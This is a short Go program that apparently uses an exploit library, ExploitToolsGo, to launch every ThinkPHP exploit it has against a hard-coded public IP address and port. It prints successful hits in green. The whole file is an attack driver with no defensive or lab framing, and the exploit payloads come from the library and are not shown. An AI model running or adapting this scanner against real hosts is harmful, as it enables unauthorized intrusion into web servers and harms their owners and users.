package main

import (
	"ExploitToolsGo"
	"github.com/gookit/color"
	"strings"
)

func main() {
	var exploit ExploitToolsGo.ExploitToolsGo
	results, errs := exploit.Cms.ThinkPHP.SetUrl("http://198.23.137.158:8080/").ScanAllExploits()

	for {
		select {
		case err, ok := <-errs:
			if !ok {
				return
			} else {
				color.Redln(err)
			}
		case result, ok := <-results:
			if !ok {
				return
			} else {
				if strings.Contains(result, "[+]") {
					color.Greenln(result)
				} else {
					color.Yellowln(result)
				}
			}
		}
	}
}
